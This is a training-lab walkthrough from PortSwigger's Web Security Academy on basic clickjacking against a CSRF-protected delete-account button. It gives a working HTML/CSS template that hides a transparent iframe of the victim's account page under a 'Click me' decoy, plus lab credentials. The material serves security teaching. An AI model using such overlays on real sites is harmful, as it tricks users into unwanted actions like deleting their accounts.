## Basic clickjacking with CSRF token protection

**Category:** clickjacking
**Difficulty:** Unknown

### Description
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

### Solution Steps
1. Log in to your account on the target website.
2. Go to the exploit server and paste the following HTML template into the Body section: <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
3. Make the following adjustments to the template: Replace YOUR-LAB-ID in the iframe src attribute with your unique lab ID. Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively). Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click Store and then View exploit .
5. Hover over Test me and ensure the cursor changes to a hand indicating that the div element is positioned correctly. Do not actually click the "Delete account" button yourself. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click Store .
7. Click on Deliver exploit to victim and the lab should be solved.

### Key Payloads
- `wiener:peter`
- `<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`
- `YOUR-LAB-ID`
- `$height_value`
- `$width_value`
- `$top_value`
- `$side_value`
- `$opacity`
- `left`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: clickjacking

---
*Source: PortSwigger Web Security Academy*
